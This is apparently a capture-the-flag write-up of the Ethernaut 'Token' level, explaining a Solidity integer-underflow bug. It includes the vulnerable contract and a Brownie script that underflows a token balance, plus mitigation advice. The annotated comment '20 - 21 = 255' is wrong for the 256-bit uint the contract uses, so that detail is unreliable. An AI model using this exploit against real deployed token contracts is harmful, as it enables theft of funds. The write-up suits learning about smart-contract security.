---
title: Ethernaut - Level 05 - Token
date: 2022-09-15
---
{{<figure src="../images/token-5.svg" caption="Image courtesy of OpenZeppelin">}}
## Ethernaut 05 - Token
This level from Ethernaut, called Token, is a good exercise to become familiar with the **integer underflow** and **integer overflow** concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a **very large number of tokens**.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

As usual, lets start explaining some basic concepts before we dive deep into where is the vulnerability and how to exploit it.

The hint that we get for this challenge is to look up what an `odometer` is. At first it may not sound very clear to you but let's briefly explain why odometers may be related with this vulnerable contract.

Odometers have been used for decades in the form of milage counters in cars or to measure the flow of electricity in units call kilowatt-hour. These meters have been replaced to digital ones, but back in the days they used to be analog and had a maximum of six digits that could count up to 999999. Once they reached its maximum value the counter would start over at the next available value of the odometer, which would be 000000. This behavior is what we would call in programming as **overflow**.

Now imagine the opposite, think for a moment that your odometer has reached the value 000000 and your flow of electricity is negative. As you may have thought already, the odometer would count backwards and go to the next available value possible, which would be 999999. That's what we would call an **underflow**

For the sake of simplicity, lets translate these concepts into Solidity and assume we have an unsigned 8-bit integer (**uint8**) which cannot hold negative values and only holds 8 bits of data that can be either 0 or 1, meaning we have 2^8 or 256 possible values ranging from 0 to 255.

{{<figure src="../images/ethernaut-token-5-pic1.png" caption="Visual representation for an integer overflow and underflow">}}

Based on this, when you attempt to make a `uint8` negative, this will trigger an underflow and it will turn out to contain a high value instead. The opposite happens when you attempt to increment a `uint8` that has 255 as value, triggering an overflow.

## Where is the vulnerability?
Now that we have explained the basics on this type of vulnerability let's see where the problem with this contract is.

As you may have figured out already, the vulnerability in this contract is in the `transfer` method, concretely in the `require` statement:


```solidity {lineos=table,hl_lines=[2],lineofstart=1}
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // _value >= 21
    balances[msg.sender] -= _value; // 20 - 21 = 255
    balances[_to] += _value; // 0 + 21 = 21
```

We must provide a value that causes an integer underflow and the only way to achieve this is by providing a value higher than 20 __*__.

__*__ *Every time we create a new instance of this contract we will receive as player a total of 20 tokens* 

The `require` statement would pass only if the value obtained from `balances[msg.sender] - _value` is greater or equal to 0. As we have mentioned earlier in this post, if we attempt to make a `uint8` variable negative, this will trigger an underflow and it will turn out to contain a high value instead. Based on this, it looks like the number `21` may help us achieve our purpose, as it will trigger an underflow (_remember that we have been granted 20 tokens_), setting our balance to `255`.


## Hacking the contract
The exploitation of this contract will be pretty straightforward and simple and it won't require creating a malicious contract. Instead, we will simply create a new instance of the vulnerable contract and call the `public` method, `transfer`, as shown below:


```python {lineos=table,hl_lines=[5,10,12],lineofstart=1}
from brownie import accounts, config, interface

def attack(token, hacker, fake_account):
    print(f'Balance before attack: {token.balanceOf(hacker)}')
    tx = token.transfer(fake_account, 21, {'from': hacker, 'allow_revert':True})
    tx.wait(2)
    print(f'Balance after attack: {token.balanceOf(hacker)}')

def main(target):
    token = interface.TokenInterface(target)
    hacker = accounts.add(config['wallets']['from_key'])
    fake_account = "0x00000000000000000000000000000000cafebabe"

    attack(token, hacker, fake_account)
```

Once we execute the script, the `token.transfer` call will start the attack by sending `21` tokens to the vulnerable contract, and therefore, causing the **integer underflow** and completing this challenge.

## Takeaways
Although these vulnerabilities are no longer exploitable on recent versions of solidity (`v.0.8.0`) as underflow/overflow causes failing assertion by default, it is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system, such as openzeppelin's [SafeMath](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath).